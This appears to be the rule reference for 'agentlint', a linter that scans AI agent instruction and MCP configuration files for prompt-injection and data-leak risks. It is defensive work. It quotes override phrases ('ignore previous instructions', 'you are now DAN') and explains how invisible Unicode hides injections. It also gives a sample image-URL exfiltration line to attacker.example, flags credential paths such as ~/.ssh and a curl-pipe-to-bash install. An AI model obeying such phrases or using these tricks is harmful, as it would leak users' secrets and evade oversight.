# agentlint Rule Taxonomy

Static analysis rules for AI agent configuration files. Each rule has an ID (AGT###), severity, category, and fix guidance.

---

## Unicode / Encoding (AGT001–AGT007)

Invisible or unusual Unicode characters can hide malicious instructions from human reviewers while remaining visible to LLMs.

| ID | Severity | Autofixable | Description |
|----|----------|-------------|-------------|
| AGT001 | **critical** | yes | Bidirectional control characters (U+202A–U+202E, U+2066–U+2069) |
| AGT002 | **error** | yes | Zero-width characters (U+200B–U+200D, U+FEFF, U+2060) |
| AGT003 | **critical** | yes | Unicode tag characters (U+E0000–U+E007F) |
| AGT004 | warn | no | Homoglyphs/confusable characters in code or command context |
| AGT005 | warn | yes | Non-printable control characters outside normal whitespace |
| AGT006 | info | no | Mixed Unicode scripts in identifier or command token |
| AGT007 | warn | yes | ANSI escape sequences in markdown content |

### AGT001 — Bidirectional Control Characters
Bidi overrides (RLO, LRO, etc.) can make source code display differently from what is actually executed. In instruction files, they can visually reverse portions of text so that a "harmless" phrase actually contains an injection payload when read by the model.

**Fix:** Remove the characters. Run `agentlint fix` for auto-removal.

### AGT002 — Zero-Width Characters
Zero-width spaces, joiners, and word joiners are invisible in most editors and renderers but are included in the text sent to LLMs. They are used to split keywords to defeat pattern matching: `ignor​e` (contains U+200B).

**Fix:** Remove the characters. Run `agentlint fix` for auto-removal.

### AGT003 — Tag Characters
Unicode Tags block (U+E0000–U+E007F) is used for language tags but has been demonstrated as a steganographic channel for prompt injection. Characters in this range are invisible in all standard renderers.

**Fix:** Remove the characters. Run `agentlint fix` for auto-removal.

### AGT004 — Confusable Characters
Cyrillic `а` (U+0430) is visually identical to Latin `a`. In tool names and commands, substituting such confusables can redirect the model to call a different function. Only checked in code-like contexts (backtick spans, indented blocks) to minimize false positives.

### AGT005 — Non-printable Control Characters
Control characters other than `\n`, `\r`, `\t` should not appear in instruction files. Their presence usually indicates tampering or encoding errors.

### AGT006 — Mixed Scripts in Identifiers
Tokens that mix Latin with Cyrillic or Greek may be homoglyph attacks. Applied only to identifiers in code blocks and YAML values.

### AGT007 — ANSI Escape Sequences
ANSI codes embedded in markdown have no rendering purpose and may be used to manipulate terminal-based tools or inject content.

---

## Instruction Override (AGT020–AGT024)

Patterns that attempt to cancel, replace, or override the agent's system instructions.

| ID | Severity | Description |
|----|----------|-------------|
| AGT020 | **critical** | "Ignore previous/above instructions" and variants |
| AGT021 | **critical** | Roleplay jailbreak openings ("you are now DAN", etc.) |
| AGT022 | **critical** | System-prompt impersonation ([SYSTEM]:, <system>, etc.) |
| AGT023 | **error** | False authority claims ("user has pre-approved", etc.) |
| AGT024 | warn | Urgency or threat framing directed at the model |

### Detection Method
AGT020–AGT024 use Aho-Corasick multi-pattern matching with case-insensitive normalization. Two passes are run: one on raw content and one on NFKC-normalized + zero-width-stripped content, to catch obfuscated variants.

---

## Exfiltration Sinks (AGT040–AGT043)

Instructions that could cause the agent to leak data to external parties.

| ID | Severity | Description |
|----|----------|-------------|
| AGT040 | **error** | Markdown image URL with data-carrying query string |
| AGT041 | **error** | Auto-fetched URL from URL shortener or paste site |
| AGT042 | **critical** | Instructions referencing sensitive paths (SSH keys, AWS creds, .env) |
| AGT043 | **error** | File-read command near network call within 500 characters |

### AGT040 — Image Exfiltration
`![x](https://attacker.example/p?data=SECRET)` causes many agent frameworks to fetch the URL, embedding data in the request. Detected by combining tree-sitter image node extraction with query-parameter analysis.

### AGT042 — Sensitive Path References
Checks for mentions of `~/.ssh/`, `~/.aws/`, `.env.production`, `id_rsa`, `ANTHROPIC_API_KEY`, and similar patterns. Any instruction referencing these paths may be directing the agent to read and exfiltrate credentials.

---

## Dangerous Tool Patterns / MCP Config (AGT060–AGT064)

Applies to `claude_desktop_config.json` and similar MCP server configuration files.

| ID | Severity | Description |
|----|----------|-------------|
| AGT060 | warn/critical | Server installed from unpinned source (npx, uvx, curl\|sh) |
| AGT061 | **error** | Server points to private/local URL in shared config |
| AGT062 | **error** | Filesystem read + arbitrary HTTP (exfil pair) |
| AGT063 | **critical** | Shell execution + network (RCE-to-C2 pair) |
| AGT064 | warn | Server description claims capabilities not in tool list |

### AGT060 — Unpinned Source
`npx some-package` resolves to the latest version at runtime. A compromised package registry entry can swap in malicious code. Always pin: `npx some-package@1.2.3`.

`curl https://example.com/install.sh | bash` executes arbitrary remote code. Never use this pattern.

### AGT062/AGT063 — Dangerous Capability Pairs
These rules look at the combined capability surface across all configured servers. If the agent can both read local files AND make arbitrary HTTP requests, it can exfiltrate anything. If it can execute shell commands AND reach the network, it is a remote code execution target connected to C2.

---

## Skill Metadata Hygiene (AGT080–AGT082)

Applies to `SKILL.md` files with YAML frontmatter.

| ID | Severity | Description |
|----|----------|-------------|
| AGT080 | info | Frontmatter `description` lacks meaningful trigger keywords |
| AGT081 | warn | Skill body references files outside the skill directory |
| AGT082 | **critical** | Skill instructs the agent to disable safety checks |

### AGT082 — Safety Disable
Any instruction to "disable safety", "bypass content filter", "ignore ethical guidelines", or similar is a red flag regardless of stated intent. Skills should work within the agent's safety framework, not around it.

---

## False Positive Guidance

- **AGT004** (confusables): Only fires inside backtick and indented-code contexts. Natural language text is not checked.
- **AGT006** (mixed scripts): Only fires on word-tokens, not on general text. Multilingual documents that use scripts without mixing them within a single identifier are unaffected.
- **AGT020–AGT024**: Pattern lists are tuned to minimize false positives. Negative constructions like "do **not** ignore previous feedback" are not matched (the patterns require the verb to directly precede the object).
- **AGT042**: The sensitive-path list targets credential-related paths. Generic filenames like `.env` in a context like "avoid committing .env files" may produce a finding — suppress with `# agentlint-ignore AGT042` on that line (not yet implemented in v0.1).

---

## Rule Applicability Matrix

| Rule | SkillMd | ClaudeMd | CursorRules | CopilotInstructions | GenericAgentMd | McpConfig |
|------|---------|----------|-------------|---------------------|----------------|-----------|
| AGT001–AGT007 | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| AGT020–AGT024 | ✓ | ✓ | ✓ | ✓ | ✓ | |
| AGT040–AGT043 | ✓ | ✓ | ✓ | ✓ | ✓ | |
| AGT060–AGT064 | | | | | | ✓ |
| AGT080–AGT082 | ✓ | ✓ | ✓ | ✓ | ✓ | |
